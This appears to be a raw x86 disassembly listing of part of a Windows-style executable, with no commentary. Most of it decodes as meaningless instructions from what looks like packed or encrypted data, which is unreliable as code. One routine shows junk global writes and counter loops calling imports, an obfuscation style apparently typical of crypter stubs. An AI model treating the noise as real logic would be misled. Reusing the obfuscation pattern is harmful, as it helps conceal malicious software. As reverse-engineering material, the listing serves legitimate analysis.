  40d372:	xor    DWORD PTR [edx-0x22],edx
  40d375:	aaa    
  40d376:	adc    BYTE PTR [edi],bh
  40d378:	and    ch,bh
  40d37a:	nop
  40d37b:	mov    edi,DWORD PTR [esi+0x58]
  40d37e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d37f:	outs   dx,BYTE PTR ds:[esi]
  40d380:	mov    ebx,0x4e5500dd
  40d385:	int3   
  40d386:	fwait
  40d387:	je     0x40d3f3
  40d389:	rol    DWORD PTR [esi-0x7eb2d2e3],cl
  40d38f:	dec    edx
  40d390:	setle  BYTE PTR [esi]
  40d393:	and    al,BYTE PTR [ebp+0x39]
  40d396:	or     al,0x46
  40d398:	mov    ch,dl
  40d39a:	adc    esi,DWORD PTR [edx-0x3b]
  40d39d:	fmul   QWORD PTR [esi]
  40d39f:	(bad)  
  40d3a0:	test   eax,0xbb0e6d30
  40d3a5:	ja     0x40d39c
  40d3a7:	mov    edi,0x7a391add
  40d3ac:	les    ecx,FWORD PTR [esi]
  40d3ae:	pop    esp
  40d3af:	ret    
  40d3b0:	sub    BYTE PTR [eax],bh
  40d3b2:	xchg   DWORD PTR [edx+0x435871b9],esp
  40d3b8:	idiv   BYTE PTR [ecx-0x116d62eb]
  40d3be:	sar    BYTE PTR [ebp-0x2c],cl
  40d3c1:	mov    ecx,0xed92b714
  40d3c6:	push   es
  40d3c7:	pushf  
  40d3c8:	lds    esi,FWORD PTR [eax-0x19ff36bb]
  40d3ce:	push   ss
  40d3cf:	mov    BYTE PTR fs:[edx+ebx*2],cl
  40d3d3:	sub    ebx,0x53
  40d3d6:	pop    es
  40d3d7:	mov    ebx,0x40e57c28
  40d3dc:	pop    esi
  40d3dd:	or     edx,DWORD PTR [edx+0x68]
  40d3e0:	add    edx,DWORD PTR [ecx+0x43f50e8]
  40d3e6:	pop    ds
  40d3e7:	setae  BYTE PTR [edi+0x3a1b632e]
  40d3ee:	sar    BYTE PTR [ebx],1
  40d3f0:	jmp    0x7f60d146
  40d3f5:	jns    0x40d474
  40d3f7:	into   
  40d3f8:	or     DWORD PTR [eax-0xc],0xffffffde
  40d3fc:	inc    ebp
  40d3fe:	(bad)  
  40d3ff:	lods   eax,DWORD PTR ds:[esi]
  40d400:	in     eax,0xda
  40d402:	xchg   esp,eax
  40d403:	push   es
  40d404:	pop    ebp
  40d405:	xor    bl,dl
  40d407:	push   cs
  40d408:	pop    edx
  40d409:	mov    eax,0xe3414b89
  40d40e:	xchg   ebp,eax
  40d40f:	test   eax,0x21e8afd7
  40d414:	(bad)  [edi+0x189bf239]
  40d41a:	jmp    0x7d69f705
  40d41f:	in     eax,dx
  40d420:	dec    eax
  40d421:	xor    DWORD PTR [eax],esi
  40d423:	adc    ecx,DWORD PTR [ebp+0x1d93e02e]
  40d429:	mov    ds:0x11a85b4b,al
  40d42e:	xlat   BYTE PTR ds:[ebx]
  40d42f:	xchg   esi,eax
  40d430:	lea    esp,[ebx]
  40d432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d433:	imul   esi,DWORD PTR [edx+0x31],0x7f80962d
  40d43a:	xchg   ecx,eax
  40d43b:	rol    DWORD PTR [edx-0x239be0d3],cl
  40d441:	push   ecx
  40d442:	jb     0x40d45b
  40d444:	adc    eax,0xf41f241
  40d449:	push   ebx
  40d44a:	dec    edi
  40d44b:	(bad)  
  40d44d:	adc    edx,ecx
  40d44f:	pop    edi
  40d450:	sub    esp,edx
  40d452:	stc    
  40d453:	mov    al,ds:0xf3cec978
  40d458:	xchg   edx,eax
  40d459:	test   eax,0x220816ee
  40d45e:	fcom   QWORD PTR [eax-0x26]
  40d461:	mov    WORD PTR [eax+ebx*1],fs
  40d464:	ds push ebx
  40d466:	sbb    DWORD PTR [edx+0x35f0158d],ebx
  40d46c:	mov    eax,0x5635ee54
  40d471:	ret    0x709
  40d474:	xchg   esi,eax
  40d475:	imul   ebp,DWORD PTR [ecx+esi*8-0x59],0x7c
  40d47a:	jl     0x40d433
  40d47c:	adc    eax,ebx
  40d47e:	pop    eax
  40d47f:	fist   WORD PTR [ebx]
  40d481:	jle    0x40d409
  40d483:	cmp    dl,ch
  40d485:	(bad)  
  40d486:	out    dx,eax
  40d487:	jmp    0x40d42a
  40d489:	lock dec esi
  40d48b:	push   ecx
  40d48c:	dec    ecx
  40d48d:	xchg   DWORD PTR [edx],esi
  40d48f:	jmp    0xa159:0x272a5bee
  40d496:	xor    DWORD PTR [edx+0x7c],0x36
  40d49a:	dec    ebx
  40d49b:	inc    ebp
  40d49c:	sub    DWORD PTR [eax-0x28],edi
  40d49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a0:	jns    0x40d49e
  40d4a2:	fnstsw WORD PTR [ebx+0x5e]
  40d4a5:	xchg   edi,eax
  40d4a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a7:	add    bl,BYTE PTR [edi-0x2e]
  40d4aa:	test   DWORD PTR [ecx],0xaf07524d
  40d4b0:	imul   ecx,eax,0x7e446e4e
  40d4b6:	push   esp
  40d4b7:	jo     0x40d485
  40d4b9:	popa   
  40d4ba:	adc    BYTE PTR [esi-0x55],bl
  40d4bd:	jp     0x40d48d
  40d4bf:	pusha  
  40d4c0:	jle    0x40d533
  40d4c2:	mov    BYTE PTR [eax+esi*4],bh
  40d4c5:	int3   
  40d4c6:	clc    
  40d4c7:	lahf   
  40d4c8:	dec    esi
  40d4c9:	sub    al,0x6a
  40d4cb:	retf   
  40d4cc:	xor    ecx,DWORD PTR [ecx+0x651e7980]
  40d4d2:	mov    ebx,0x99c43a2b
  40d4d7:	mov    ah,BYTE PTR [eax+0x468659a4]
  40d4dd:	dec    ebp
  40d4de:	rol    DWORD PTR [esi+0x21],cl
  40d4e1:	adc    dh,BYTE PTR [ebx+0x55]
  40d4e4:	xchg   ecx,eax
  40d4e5:	imul   ebp,DWORD PTR [edi+0x5f24c1ba],0x8795051
  40d4ef:	lods   al,BYTE PTR ds:[esi]
  40d4f0:	fsub   QWORD PTR [ecx]
  40d4f2:	scas   al,BYTE PTR es:[edi]
  40d4f3:	or     BYTE PTR [ebx+0x431a2f55],dl
  40d4f9:	out    dx,eax
  40d4fa:	cmp    al,0x57
  40d4fc:	jle    0x40d4e3
  40d4fe:	jae    0x40d57d
  40d500:	cmp    esi,edx
  40d502:	jae    0x40d4d9
  40d504:	dec    ebp
  40d505:	and    ch,al
  40d507:	cmp    BYTE PTR [esi],al
  40d509:	push   ebx
  40d50a:	test   DWORD PTR [ebp+0x36e8b723],esi
  40d510:	pop    ds
  40d511:	arpl   WORD PTR [eax],si
  40d513:	cmp    eax,0x3a294746
  40d518:	sbb    BYTE PTR [edi],bh
  40d51a:	(bad)  
  40d51c:	arpl   WORD PTR cs:[ebp+0x4bc51ecd],bx
  40d523:	jb     0x40d4bc
  40d525:	pop    esi
  40d526:	xchg   BYTE PTR [ebx],al
  40d528:	push   ds
  40d529:	push   ecx
  40d52a:	push   esi
  40d52b:	repnz inc BYTE PTR cs:[ecx+0x66d906a9]
  40d533:	fisub  DWORD PTR [edx+edx*4]
  40d536:	jo     0x40d545
  40d538:	xor    BYTE PTR [eax-0x53],bl
  40d53b:	push   esi
  40d53c:	mov    ebp,0xa021d75e
  40d541:	retf   0x9151
  40d544:	mov    ch,0xb4
  40d546:	xchg   BYTE PTR [esi],cl
  40d548:	ja     0x40d4d7
  40d54a:	ror    BYTE PTR [ebp-0x43541627],0x37
  40d551:	popf   
  40d552:	mov    eax,ds:0xa50d520
  40d557:	aaa    
  40d558:	jno    0x40d4ef
  40d55a:	adc    DWORD PTR [esi-0x848f564],0x2c
  40d561:	pop    esp
  40d562:	shl    ecx,1
  40d564:	mov    ch,0x8d
  40d566:	sub    eax,0x956018d5
  40d56b:	mov    dh,0xcf
  40d56d:	dec    esp
  40d56e:	lds    esi,FWORD PTR [ebx-0x2b]
  40d571:	pop    es
  40d572:	sub    DWORD PTR [esi-0x33],esp
  40d575:	push   eax
  40d576:	test   esi,edi
  40d578:	jne    0x40d4fd
  40d57a:	jne    0x40d4fc
  40d57c:	sar    BYTE PTR [eax-0x1],0xbb
  40d580:	xor    BYTE PTR [edx+0x58],0x41
  40d584:	out    0x4a,al
  40d586:	int    0x6f
  40d588:	add    DWORD PTR [edx+0x1a1c0343],edi
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x99a0482a
  40d6f9:	(bad)  
  40d6fa:	mov    edi,esp
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6d1
  40d705:	xor    BYTE PTR [ebx+eiz*8-0x4bc03f9b],ch
  40d70c:	push   esp
  40d70d:	sbb    cl,bl
  40d70f:	mov    cs:0xf6fdd2f7,al
  40d715:	int3   
  40d716:	mov    ah,0xc6
  40d718:	mov    dh,bl
  40d71a:	add    eax,0xe9f3a39c
  40d71f:	xchg   esp,eax
  40d720:	in     al,dx
  40d721:	shl    BYTE PTR [esi],1
  40d723:	inc    ebx
  40d724:	aaa    
  40d725:	mov    ds:0x23264c5a,al
  40d72a:	loope  0x40d79b
  40d72c:	loop   0x40d74a
  40d72e:	std    
  40d72f:	sahf   
  40d730:	sub    ah,BYTE PTR [edx]
  40d732:	fild   WORD PTR [ebp+0x18718f15]
  40d738:	pop    eax
  40d739:	loop   0x40d73a
  40d73b:	mov    al,ds:0x2a08955d
  40d740:	push   esp
  40d741:	pop    ss
  40d742:	mov    ds:0x8ba846c5,eax
  40d747:	(bad)
  40d74a:	int    0x64
  40d74c:	jmp    0x78f0:0x1936d255
  40d753:	mov    bh,0x76
  40d755:	stc    
  40d756:	sub    cl,BYTE PTR [esi+edx*8]
  40d759:	(bad)  
  40d75a:	std    
  40d75b:	jnp    0x40d752
  40d75d:	rcl    eax,1
  40d75f:	sbb    edx,edi
  40d761:	and    ecx,esp
  40d763:	hlt    
  40d764:	add    al,0xcd
  40d766:	sub    DWORD PTR [ebp+0x6330be2e],ecx
  40d76c:	inc    edi
  40d76d:	dec    eax
  40d76e:	inc    ebp
  40d76f:	lods   al,BYTE PTR ds:[esi]
  40d770:	and    al,0x5a
  40d772:	sub    eax,0x95ce0277
  40d777:	sahf   
  40d778:	ror    DWORD PTR [edx-0x1e5b7398],1
  40d77e:	mov    bl,0x46
  40d780:	push   edi
  40d781:	push   es
  40d782:	loope  0x40d7bd
  40d784:	iret   
  40d785:	dec    esp
  40d786:	popf   
  40d787:	dec    ecx
  40d788:	sbb    DWORD PTR [ebx-0x746b0967],edi
  40d78e:	nop
  40d78f:	sbb    ah,BYTE PTR [edi]
  40d791:	mov    bh,0x74
  40d793:	aaa    
  40d794:	inc    esp
  40d795:	inc    ebx
  40d796:	int3   
  40d797:	and    eax,0x7b30d8cf
  40d79c:	mov    eax,0xca67bc8a
  40d7a1:	jo     0x40d7e9
  40d7a3:	test   eax,0x2496833a
  40d7a8:	jmp    FWORD PTR [ecx-0x6c5c05a1]
  40d7ae:	mov    edx,DWORD PTR [ebx+0x78]
  40d7b1:	dec    edx
  40d7b2:	mov    cs,ebp
  40d7b4:	lock fyl2x 
  40d7b7:	inc    edi
  40d7b8:	inc    eax
  40d7b9:	xor    DWORD PTR [ebx+0x68858fd2],0xffffff99
  40d7c0:	vprotw ymm12,xmm0,0x26
  40d7c5:	cmp    esi,edx
  40d7c7:	or     DWORD PTR [ecx],esp
  40d7c9:	jae    0x40d757
  40d7cb:	mov    eax,ds:0xe82072d7
  40d7d0:	sti    
  40d7d1:	clc    
  40d7d2:	neg    DWORD PTR [ebp+0x53fdda64]
  40d7d8:	hlt    
  40d7d9:	int3   
  40d7da:	out    0x19,eax
  40d7dc:	mov    eax,esi
  40d7de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7df:	mov    eax,ds:0x48106931
  40d7e4:	mov    ecx,ss
  40d7e6:	sbb    eax,0x919c5ba7
  40d7eb:	aad    0x48
  40d7ed:	push   edi
  40d7ee:	iret   
  40d7ef:	idiv   BYTE PTR [esi-0xd]
  40d7f2:	mov    ebp,eax
  40d7f4:	mov    bl,0xdc
  40d7f6:	adc    eax,0x11727e8d
  40d7fb:	shl    DWORD PTR [eax+0x75ee1a90],1
  40d801:	fcmovne st,st(6)
  40d803:	xchg   esp,eax
  40d804:	jg     0x40d795
  40d806:	adc    bl,dh
  40d808:	ins    DWORD PTR es:[edi],dx
  40d809:	add    dh,ch
  40d80b:	inc    edx
  40d80c:	jl     0x40d7c3
  40d80e:	adc    BYTE PTR [eax+0x5d],dl
  40d811:	fidiv  DWORD PTR [ebp+0x360bd495]
  40d817:	mov    ebp,0x24fe43b2
  40d81c:	dec    edi
  40d81d:	cdq    
  40d81e:	xchg   ebp,eax
  40d81f:	mov    dl,0xe5
  40d821:	leave  
  40d822:	stc    
  40d823:	and    al,0xd2
  40d825:	lahf   
  40d826:	dec    ecx
  40d828:	mov    ebx,0x4fd14ce4
  40d82d:	fld    TBYTE PTR [ecx-0x14]
  40d830:	mov    bl,ch
  40d832:	adc    BYTE PTR [edx],dl
  40d834:	lods   al,BYTE PTR ds:[esi]
  40d835:	shl    DWORD PTR [ebp-0x18],0xaa
  40d839:	ficomp WORD PTR [eax+ebx*2]
  40d83c:	jecxz  0x40d875
  40d83e:	mov    ch,0x9c
  40d840:	pop    esi
  40d841:	mov    WORD PTR [edx-0x4b],gs
  40d844:	out    dx,eax
  40d845:	xor    cl,BYTE PTR [ebp-0x3d]
  40d848:	(bad)  
  40d849:	das    
  40d84a:	add    DWORD PTR [edi],ebp
  40d84c:	sahf   
  40d84d:	xchg   esp,eax
  40d84e:	inc    ecx
  40d84f:	sub    edi,DWORD PTR [ebx+0x78251db2]
  40d855:	pop    esp
  40d856:	enter  0x1734,0x86
  40d85a:	das    
  40d85b:	pop    esi
  40d85c:	cmp    edx,DWORD PTR [ebx-0x75]
  40d85f:	mov    WORD PTR [ecx-0x7f],ds
  40d862:	(bad)  
  40d863:	push   ss
  40d864:	pop    eax
  40d865:	out    0x30,eax
  40d867:	in     eax,0x4b
  40d869:	(bad)  
  40d86a:	out    dx,eax
  40d86b:	xlat   BYTE PTR ds:[ebx]
  40d86c:	jns    0x40d859
  40d86e:	ja     0x40d867
  40d870:	sub    esi,DWORD PTR [edx-0x567f4068]
  40d876:	call   0x70b:0xce7b013b
  40d87d:	jl     0x40d8eb
  40d87f:	inc    ebp
  40d880:	push   0x5b5b01ec
  40d885:	and    DWORD PTR [edi+0x29],0x190237c2
  40d88c:	out    dx,al
  40d88d:	test   BYTE PTR [edx],dl
  40d88f:	dec    esi
  40d890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d891:	ficom  WORD PTR [esi]
  40d893:	sub    BYTE PTR [ebx+0x48d9a933],dh
  40d899:	xchg   esp,eax
  40d89a:	lahf   
  40d89b:	shr    BYTE PTR [edx],cl
  40d89d:	out    0xfc,al
  40d89f:	inc    edx
  40d8a0:	fisttp DWORD PTR [eax+esi*8+0x7b]
  40d8a4:	add    esp,DWORD PTR [ebx-0x31ba782b]
  40d8aa:	dec    ebx
  40d8ab:	and    DWORD PTR [ecx],0xfbd3783c
  40d8b1:	xchg   edi,eax
  40d8b2:	rol    DWORD PTR [ebx-0x22],cl
  40d8b5:	dec    ebx
  40d8b6:	mov    ecx,0x986a4d6
  40d8bb:	fsub   QWORD PTR [edi+0x1b]
  40d8be:	pushf  
  40d8bf:	mov    al,ds:0x242349a8
  40d8c4:	das    
  40d8c5:	xchg   ebx,eax
  40d8c6:	pop    ecx
  40d8c7:	fwait
  40d8c8:	or     al,BYTE PTR [edi-0x67]
  40d8cb:	add    al,0x21
  40d8cd:	inc    eax
  40d8ce:	cmp    eax,0xfbadd66b
  40d8d3:	inc    ecx
  40d8d4:	jns    0x40d8d7
  40d8d6:	fnsave [edx]
  40d8d8:	add    BYTE PTR [ebp-0xd13abaf],0xf4
  40d8df:	push   ds
  40d8e0:	jb     0x40d919
  40d8e2:	pop    esi
  40d8e4:	(bad)  
  40d8e5:	int3   
  40d8e6:	lock push ds
  40d8e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e9:	dec    esi
  40d8ea:	mov    WORD PTR [edi-0x74e27e11],cs
  40d8f0:	or     BYTE PTR [ebp+0x4bd39008],ch
  40d8f6:	imul   ecx,DWORD PTR [ebx-0x67],0xe4f2a6
  40d8fd:	and    al,0x8b
  40d8ff:	xchg   esi,eax
  40d900:	ss jmp 0x11f1:0x2cfc3314
  40d908:	inc    esi
  40d909:	xor    esi,esi
  40d90b:	retf   
  40d90c:	and    al,0xe
  40d90e:	ja     0x40d8c5
  40d910:	fwait
  40d911:	imul   esi,DWORD PTR [esi+edi*2-0x67b26dce],0x59
  40d919:	icebp  
  40d91a:	mov    al,ds:0xdceaa69a
  40d91f:	mov    bl,0xfb
  40d921:	imul   esi,esp,0x9995eb1b
  40d927:	pop    esi
  40d928:	dec    ebp
  40d929:	popa   
  40d92a:	and    DWORD PTR [ebp-0x23],ecx
  40d92d:	push   esp
  40d92e:	repz les ecx,FWORD PTR [edi]
  40d931:	mov    ds:0x25a7c772,al
  40d936:	and    esi,eax
  40d938:	sub    BYTE PTR [ebx-0x60],bl
  40d93b:	or     bl,0x9b
  40d93e:	shl    BYTE PTR [eax],cl
  40d940:	pushf  
  40d941:	pop    eax
  40d942:	and    eax,edi
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xd32b51ed
  40d96a:	inc    edi
  40d96b:	cmp    esi,edi
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	adc    dl,BYTE PTR [edx]
  40d977:	mov    edi,0x28954085
  40d97c:	aas    
  40d97d:	shl    BYTE PTR [eax-0x1903944],1
  40d983:	push   cs
  40d984:	jno    0x40d954
  40d986:	push   edi
  40d987:	inc    esi
  40d988:	sub    edx,DWORD PTR [edx+0x2b]
  40d98b:	jge    0x40da09
  40d98d:	shr    BYTE PTR [esi+0x3a1094c9],0x67
  40d994:	repz aad 0x31
  40d997:	out    0xbf,eax
  40d999:	inc    esp
  40d99a:	fdiv   DWORD PTR [esi]
  40d99c:	lea    edi,[esi+0x7a]
  40d99f:	sub    BYTE PTR [ebp-0x55331996],dl
  40d9a5:	and    BYTE PTR [ecx],bh
  40d9a7:	(bad)  ds:0x935bb149
  40d9ad:	jmp    0x40da0c
  40d9af:	inc    ebx
  40d9b0:	dec    edx
  40d9b1:	(bad)  
  40d9b2:	or     ebx,ebx
  40d9b4:	xor    esi,DWORD PTR [ebx]
  40d9b6:	ins    BYTE PTR es:[edi],dx
  40d9b7:	xchg   edx,eax
  40d9b8:	bound  esi,QWORD PTR [ecx]
  40d9ba:	jbe    0x40d95d
  40d9bc:	mov    eax,0x826d2eab
  40d9c1:	cmc    
  40d9c2:	mov    eax,0x72c66470
  40d9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9c8:	inc    ecx
  40d9c9:	lahf   
  40d9ca:	shr    BYTE PTR [edi+0x5447e26b],0x52
  40d9d1:	mov    edx,0xad5be91e
  40d9d6:	pop    esp
  40d9d7:	pop    es
  40d9d8:	xchg   edx,eax
  40d9d9:	xchg   esi,eax
  40d9da:	and    ebp,edx
  40d9dc:	push   cs
  40d9dd:	adc    esi,esp
  40d9df:	add    al,0x19
  40d9e1:	xlat   BYTE PTR ds:[ebx]
  40d9e2:	dec    edx
  40d9e3:	ss dec esi
  40d9e5:	fst    QWORD PTR [edx]
  40d9e7:	add    eax,0x624f3ad0
  40d9ec:	xor    dh,BYTE PTR [edi-0x14]
  40d9ef:	out    dx,eax
  40d9f0:	push   es
  40d9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9f2:	pop    eax
  40d9f3:	and    BYTE PTR ds:0x29a6b72c,bh
  40d9f9:	sti    
  40d9fa:	daa    
  40d9fb:	push   eax
  40d9fc:	cmp    al,0x50
  40d9fe:	gs mov dh,0x4f
  40da01:	fisttp QWORD PTR [eax+0x2b]
  40da04:	or     cl,BYTE PTR [ebp-0x36]
  40da07:	outs   dx,DWORD PTR ds:[esi]
  40da08:	enter  0x5c9a,0xc8
  40da0c:	adc    DWORD PTR [esp-0x4e418f47],0xc9fa44b3
  40da17:	ret    
  40da18:	inc    eax
  40da19:	jne    0x40d9be
  40da1b:	jae    0x40da16
  40da1d:	leave  
  40da1e:	fwait
  40da1f:	pop    ebp
  40da20:	or     al,0x4b
  40da22:	xchg   esi,esi
  40da24:	sti    
  40da25:	push   0xcf984be3
  40da2a:	in     eax,dx
  40da2b:	inc    eax
  40da2c:	iret   
  40da2d:	ins    DWORD PTR es:[edi],dx
  40da2e:	js     0x40da64
  40da30:	aas    
  40da31:	pop    ebx
  40da32:	xchg   esi,eax
  40da33:	sub    al,0x58
  40da35:	or     al,0x7a
  40da37:	xchg   edx,eax
  40da38:	fucomp st(4)
  40da3a:	ds clc 
  40da3c:	xchg   edi,eax
  40da3d:	out    0x9a,eax
  40da3f:	xlat   BYTE PTR ds:[ebx]
  40da40:	dec    esi
  40da41:	xchg   edi,eax
  40da42:	and    edx,ebx
  40da44:	mov    ds:0xa583662a,al
  40da49:	repz test BYTE PTR [esi-0x76c6ae0c],0xa6
  40da51:	je     0x40da94
  40da53:	mov    dl,0xeb
  40da55:	mov    edi,0x9ab6f49c
  40da5a:	sahf   
  40da5b:	mov    ebp,0x711cf8da
  40da60:	push   cs
  40da61:	loop   0x40d9fb
  40da63:	jle    0x40da68
  40da65:	lock out 0xbc,eax
  40da68:	mov    esp,0x3d3af1c5
  40da6d:	int3   
  40da6e:	sti    
  40da6f:	mov    DWORD PTR [esp+eax*8+0x6466a4b],edi
  40da76:	cld    
  40da77:	mov    esp,0xcee01046
  40da7c:	inc    ebp
  40da7d:	cld    
  40da7e:	and    BYTE PTR [esi+0x2a34f3b0],bl
  40da84:	pop    edx
  40da85:	inc    ecx
  40da86:	mov    ah,0x89
  40da88:	mov    ds:0xf0e5cd8a,al
  40da8d:	aam    0xd4
  40da8f:	push   edx
  40da90:	mov    esi,DWORD PTR [ebp-0x4115c6e6]
  40da96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da97:	aad    0x19
  40da99:	in     al,dx
  40da9a:	or     DWORD PTR [ebp-0x45050940],0x67
  40daa1:	mov    WORD PTR [ecx],ds
  40daa3:	pop    esp
  40daa4:	sbb    eax,0xfb1efab7
  40daa9:	and    al,0x29
  40daab:	jb     0x40da7a
  40daad:	fs push 0xc205fb82
  40dab3:	jno    0x40da48
  40dab5:	cmp    al,0x37
  40dab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab8:	loopne 0x40da9a
  40daba:	sub    bl,bh
  40dabc:	dec    edi
  40dabd:	sar    DWORD PTR [eax-0x43],cl
  40dac0:	mov    edi,DWORD PTR [edx+0x703e856]
  40dac6:	push   ecx
  40dac7:	into   
  40dac8:	leave  
  40dac9:	adc    edi,esp
  40dacb:	mov    bh,0x79
  40dacd:	outs   dx,BYTE PTR ds:[esi]
  40dace:	test   BYTE PTR [ebx-0x6e],ah
  40dad1:	idiv   dh
  40dad3:	pop    ds
  40dad4:	mov    ds:0xada94ebd,eax
  40dad9:	and    al,0x56
  40dadb:	je     0x40db2b
  40dadd:	cmc    
  40dade:	dec    eax
  40dadf:	repnz ds dec ebp
  40dae2:	in     al,dx
  40dae3:	xchg   ebp,eax
  40dae4:	xchg   DWORD PTR [edi+0x60cb2ec7],eax
  40daea:	aaa    
  40daeb:	jl     0x40dae1
  40daed:	mov    DWORD PTR [eax-0x6e],ecx
  40daf0:	push   eax
  40daf1:	and    ch,BYTE PTR [edi-0x299a1d4c]
  40daf7:	or     dl,BYTE PTR [edx+0x39a5875a]
  40dafd:	dec    eax
  40dafe:	mov    ebx,0x3ae6f470
  40db03:	iret   
  40db04:	out    0x37,eax
  40db06:	adc    al,0x55
  40db08:	jmp    eax
  40db0a:	mov    ah,cl
  40db0c:	int    0x99
  40db0e:	push   eax
  40db0f:	aad    0xa0
  40db11:	ins    BYTE PTR es:[edi],dx
  40db12:	repnz xor BYTE PTR [edi-0x50a96668],0xcc
  40db1a:	aaa    
  40db1b:	out    dx,eax
  40db1c:	fs jecxz 0x40db60
  40db1f:	jge    0x40db4b
  40db21:	es sub al,0x20
  40db24:	test   BYTE PTR [edi+esi*2-0x62],ah
  40db28:	fld    TBYTE PTR [eax*8+0x507d2632]
  40db2f:	xchg   esi,eax
  40db30:	jb     0x40db00
  40db32:	arpl   WORD PTR [edi-0x6a039bf8],di
  40db38:	je     0x40db1d
  40db3a:	mov    eax,ds:0x28fa5055
  40db3f:	(bad)  
  40db40:	push   ds
  40db41:	outs   dx,DWORD PTR ds:[esi]
  40db42:	adc    DWORD PTR [ebp-0x5e4bc64],ecx
  40db48:	popa   
  40db49:	and    esi,esi
  40db4b:	lahf   
  40db4c:	push   ebx
  40db4d:	mov    eax,0xdd04c27c
  40db52:	(bad)  
  40db53:	mov    esp,ebx
  40db55:	nop
  40db56:	outs   dx,BYTE PTR ds:[esi]
  40db57:	jle    0x40db8b
  40db59:	adc    esi,DWORD PTR [ecx]
  40db5b:	mov    al,0xe9
  40db5d:	pop    eax
  40db5e:	fisubr WORD PTR [edx-0x2cb0316b]
  40db64:	push   edi
  40db65:	adc    al,0xeb
  40db67:	cwde   
  40db68:	push   eax
  40db69:	sbb    BYTE PTR [ebx+0x5d591517],dh
  40db6f:	dec    ebp
  40db70:	ds test eax,0x98566318
  40db76:	jmp    0x5c40:0x78fd135
  40db7d:	shl    BYTE PTR [esi+0x53],0xc7
  40db81:	repz add al,0xa6
  40db84:	or     DWORD PTR [edi],esp
  40db86:	popa   
  40db87:	or     bl,BYTE PTR [ebx+0x5b0b1124]
